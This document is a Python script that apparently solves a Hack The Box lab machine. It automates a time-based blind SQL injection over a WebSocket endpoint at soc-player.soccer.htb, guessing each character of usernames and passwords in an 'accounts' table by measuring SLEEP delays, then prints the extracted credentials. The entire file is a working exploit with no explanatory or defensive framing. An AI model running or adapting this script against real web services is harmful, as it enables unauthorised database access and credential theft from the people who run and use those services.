import json
import websocket
import time
import string

url = "ws://soc-player.soccer.htb:9091/"
charset = charset=string.ascii_letters + string.digits + "_@!.-"
max_len = 20
max_users = 10

credentials = {}

def extract_field(field_name, row_index):
    field_value = ""
    for i in range(1, max_len + 1):
        for c in charset:
            payload = f"1 OR IF(BINARY SUBSTRING((SELECT {field_name} FROM accounts LIMIT {row_index},1),{i},1)='{c}', SLEEP(5), 0)# "
            ws = websocket.create_connection(url)
            data = json.dumps({"id": payload})

            start = time.time()
            ws.send(data)
            result = ws.recv()
            elapsed = time.time() - start
            ws.close()

            print(f"[{field_name}][{row_index}][{i}] Trying '{c}'... {elapsed:.2f}s")

            if elapsed > 4.5:
                field_value += c
                print(f"--> Found character {i}: {c}")
                break
        else:
            print(f"End of {field_name}.")
            break

    return field_value

for i in range(max_users):
    print(f"\n--- Extracting user {i + 1} ---")
    username = extract_field("username", i)
    if not username:
        print("❌ No more users found, stopping.")
        break
    password = extract_field("password", i)
    credentials[username] = password
    print(f"✅ Found: {username} : {password}")

print("\n=== All Extracted Credentials ===")

for u, p in credentials.items():
    print(f"{u} : {p}")
